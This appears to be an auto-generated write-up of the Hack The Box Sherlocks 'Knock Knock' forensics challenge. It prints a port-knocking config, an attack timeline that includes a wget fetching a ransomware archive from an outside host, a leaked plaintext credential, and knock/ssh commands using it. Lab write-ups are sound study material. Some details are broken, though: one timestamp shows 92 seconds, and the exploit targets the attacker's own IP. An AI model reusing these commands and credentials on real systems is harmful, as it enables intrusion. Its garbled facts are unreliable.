---
title: Hack The Box Sherlocks の勧め / Knock Knock Writeup
contest: Hack The Box Sherlocks (Knock Knock)
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [htb, sherlocks, knock-knock, ftp, ssh, iptables, port-knocking, ssh-key-leak]
attack_chain:
  - 配置 /etc/knockd.conf:
  - [FTP-INTERNAL] sequence=29999,50234,45087
  - command=iptables -I INPUT -s %IP% -p tcp --dport 24456 -j ACCEPT
  - 攻击时间线: 端口扫描→密码喷射→FTP/SSH登录
  - abdullah.yasin 凭据 XhlhGame_90HJLDASxfd&hoooad
  - 凭证从 forela-finance GitHub commit 泄露
  - 下载 Ransomware2_server.zip
  - SSH 登录 22 端口
key_payload: knock 29999 50234 45087 24456
one_liner: HTB Sherlocks Knock Knock：port-knocking + GitHub 凭据泄露
lesson: GitHub commit 历史可泄露 SSH 凭据
quality: high
---

# Hack_The_Box_Sherlocks_の勧め_-_Knock_Knock_Writeup

## 题目信息
- 平台：Hack The Box Sherlocks
- 题目：Knock Knock
- 类别：DFIR 调查

## 关键攻击链
### 1. Port-Knocking 配置
```
[options]
    UseSyslog

[FTP-INTERNAL]
    sequence    = 29999,50234,45087
    seq_timeout = 5
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 24456 -j ACCEPT
    tcpflags    = syn
```

### 2. 攻击时间线
```
2023-03-21T10:42:23Z | 3.109.209.43 端口扫描开始
2023-03-21T10:49:92Z | 3.109.209.43 FTP 21/tcp 密码喷射开始
2023-03-21T10:51:04Z | 3.109.209.43 tony.shephard 登录 FTP 成功
2023-03-21T10:58:50Z | 3.109.209.43 24456/tcp abdullah.yasin 登录成功
2023-03-21T11:25:42Z | SSH 22/tcp 连接
2023-03-21T11:42:34Z | wget http://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_server.zip
2023-03-21T11:49:17Z | SSH 连接
```

### 3. 凭据泄露
```bash
# 另一备份服务器凭据 abdullah.yasin:
XhlhGame_90HJLDASxfd&hoooad

# 凭据泄露源:
# https://github.com/forela-finance/forela-dev/commit/ab04702b3269f016def0521a734380fb12596994
```

### 4. 利用
```bash
knock 3.109.209.43 29999 50234 45087
# iptables 添加 24456 端口规则
ssh abdullah.yasin@3.109.209.43 -p 24456
# 输入 XhlhGame_90HJLDASxfd&hoooad
```

## 评分
- quality: high（Port-knocking + GitHub 凭据泄露 + FTP/SSH 攻击时间线）
